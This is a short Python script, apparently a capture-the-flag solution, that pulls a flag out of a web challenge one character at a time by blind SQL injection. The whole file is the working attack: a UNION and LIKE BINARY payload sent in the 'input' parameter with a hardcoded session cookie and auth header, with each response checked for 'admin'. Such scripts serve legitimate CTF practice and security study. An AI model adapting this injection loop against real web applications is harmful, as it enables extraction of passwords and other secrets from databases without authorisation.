import requests
from string import digits, ascii_letters

flag = ''
characters = [i for i in digits + ascii_letters] + \
             ['\_', '!', '#', '@', '$', '}', '{', '|', '^', '&', '*', '(', ')', '-', '+', '=', '[', ']', '<', '>', '?',
              '`', ',', '.']

cookies = {"PHPSESSID": "mop54dh1cdejmflnkradp78u63"}
headers = {"Auth": "00dad99bfbe5cd4f14cf7dee62bfee95"}
input_pattern = """Julia'
OR
password
LIKE
BINARY
'{}%'
UNION
SELECT
'a','a','b"""

while flag == '' or flag[-1] != '}':
    for i in characters:
        flag_candidate = flag + i
        payload = {
            "input": input_pattern.format(flag_candidate)
        }
        r = requests.get('https://ch7.sbug.se/home/getinfo.php', params=payload, headers=headers, cookies=cookies)
        if b'admin' in r.content:
            flag = flag + i
            print(flag)
            break

print('Flag: {}'.format(flag.replace('\\', '')))
